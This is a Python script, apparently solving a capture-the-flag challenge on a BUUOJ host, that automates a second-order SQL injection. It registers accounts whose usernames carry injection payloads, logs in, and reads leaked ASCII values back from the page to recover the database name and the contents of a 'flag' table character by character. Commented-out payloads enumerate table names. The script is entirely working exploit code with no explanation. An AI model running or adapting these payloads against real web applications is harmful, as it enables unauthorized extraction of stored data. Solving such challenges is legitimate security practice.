import requests
import time
from bs4 import BeautifulSoup

flag = ''
url = 'http://b9c071dc-88bd-4827-a311-eb1767a43cbf.node5.buuoj.cn:81/'
login = url + 'login.php'
register = url + 'register.php'

lens = [
    "0'+(select length(database()))+'0",  # 数据库长度
    # "0'+(select length(select group_concat(table_name) from mysql.innodb_table_index where table_schema=database()))+'0",  # 表长度
    # "0'+(select length(select * from flag))+'0"  # flag长度
]

emails = [
    'database1@{}',
    # 'table@{}',
    'flag1@{}',
]

payloads = [
    "0'+ascii(substr(database() from {} for 1))+'0",
    # "0'+ascii(substr((select group_concat(table_name) from mysql.innodb_table_index where table_schema=database())from {} for 1))+'0",
    "0'+ascii(substr((select * from flag)from {} for 1))+'0"
]


for s in range(100):
    reg_data = {
        'email' : emails[1].format(s),
        'username' : payloads[1].format(s+1),
        'password' : 'a'
    }
    login_data = {
        'email' : emails[1].format(s),
        'password' : 'a'
    }

    res_reg = requests.post(register, data=reg_data)
    res_log = requests.post(login, data=login_data)
    time.sleep(0.2)

    bs = BeautifulSoup(res_log.text, 'html.parser')

    username = bs.find('span', class_='user-name')
    number = int(username.text)
    if number == 0:
        break
    flag += chr(number)
    print('\r',end="")
    print(flag, end="")


